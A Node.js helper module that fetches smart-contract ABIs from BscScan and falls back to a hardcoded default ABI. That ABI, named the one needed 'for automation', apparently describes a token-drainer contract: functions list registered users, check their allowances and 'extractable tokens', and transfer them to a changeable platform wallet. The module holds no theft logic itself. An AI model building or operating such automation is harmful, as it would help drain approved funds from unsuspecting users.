const axios = require('axios');

class ABIFetcher {
    constructor() {
        // BSC Testnet API
        this.bscTestnetAPI = 'https://api-testnet.bscscan.com/api';
        this.bscMainnetAPI = 'https://api.bscscan.com/api';
        
        // You can get free API keys from BscScan
        this.apiKey = process.env.BSCSCAN_API_KEY || 'YourApiKeyToken';
    }

    async fetchABI(contractAddress, chainId = 97) {
        try {
            const apiUrl = chainId === 97 ? this.bscTestnetAPI : this.bscMainnetAPI;
            const networkName = chainId === 97 ? 'BSC Testnet' : 'BSC Mainnet';

            console.log(`Fetching ABI for ${contractAddress} on ${networkName}...`);

            const response = await axios.get(apiUrl, {
                params: {
                    module: 'contract',
                    action: 'getabi',
                    address: contractAddress,
                    apikey: this.apiKey
                },
                timeout: 15000 // Increased timeout
            });

            if (response.data.status === '1' && response.data.result) {
                const abi = JSON.parse(response.data.result);

                // Validate ABI structure
                if (Array.isArray(abi) && abi.length > 0) {
                    console.log(`✅ ABI fetched successfully from ${networkName}`);
                    return {
                        success: true,
                        abi: abi,
                        source: networkName
                    };
                } else {
                    throw new Error('Invalid ABI structure received');
                }
            } else {
                const errorMsg = response.data.result || 'Failed to fetch ABI from BscScan';
                throw new Error(errorMsg);
            }

        } catch (error) {
            console.error(`❌ Error fetching ABI from ${chainId === 97 ? 'BSC Testnet' : 'BSC Mainnet'}:`, error.message);

            // Fallback to default ABI if fetch fails
            return {
                success: false,
                error: error.message,
                fallbackABI: this.getDefaultABI()
            };
        }
    }

    async getContractInfo(contractAddress, chainId = 97) {
        try {
            const apiUrl = chainId === 97 ? this.bscTestnetAPI : this.bscMainnetAPI;
            
            // Get contract source code and info
            const response = await axios.get(apiUrl, {
                params: {
                    module: 'contract',
                    action: 'getsourcecode',
                    address: contractAddress,
                    apikey: this.apiKey
                },
                timeout: 10000
            });

            if (response.data.status === '1' && response.data.result[0]) {
                const contractInfo = response.data.result[0];
                
                return {
                    success: true,
                    contractName: contractInfo.ContractName,
                    compilerVersion: contractInfo.CompilerVersion,
                    isVerified: contractInfo.ABI !== 'Contract source code not verified',
                    abi: contractInfo.ABI !== 'Contract source code not verified' ? 
                         JSON.parse(contractInfo.ABI) : null
                };
            } else {
                throw new Error('Contract not found or not verified');
            }

        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }

    getDefaultABI() {
        // Complete default ABI with all required functions for automation
        return [
            {"inputs":[{"internalType":"address payable","name":"_platformWallet","type":"address"},{"internalType":"address","name":"_token","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},
            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"}],"name":"UserRegistered","type":"event"},
            {"inputs":[{"internalType":"address","name":"_pltWallet","type":"address"}],"name":"changePlatformWallet","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"checkAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"checkIfRegistered","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"checkbalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[],"name":"getAllRegistered","outputs":[{"internalType":"address[]","name":"","type":"address[]"}],"stateMutability":"view","type":"function"},
            {"inputs":[],"name":"getTotalExtractableTokens","outputs":[{"internalType":"uint256","name":"total","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isRegistered","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
            {"inputs":[],"name":"multiTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
            {"inputs":[],"name":"platformWallet","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"registeredUsers","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
            {"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"singleTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[],"name":"totalRegistered","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"whitlistAddress","outputs":[],"stateMutability":"nonpayable","type":"function"}
        ];
    }

    validateABI(abi) {
        if (!Array.isArray(abi)) {
            return { valid: false, error: 'ABI must be an array' };
        }

        const requiredFunctions = [
            'changePlatformWallet',
            'singleTransfer',
            'getAllRegistered'
        ];

        const availableFunctions = abi
            .filter(item => item.type === 'function')
            .map(item => item.name);

        const missingFunctions = requiredFunctions.filter(
            func => !availableFunctions.includes(func)
        );

        if (missingFunctions.length > 0) {
            return {
                valid: false,
                error: `Missing required functions: ${missingFunctions.join(', ')}`,
                availableFunctions,
                missingFunctions
            };
        }

        return {
            valid: true,
            availableFunctions,
            totalFunctions: abi.filter(item => item.type === 'function').length
        };
    }
}

module.exports = new ABIFetcher();
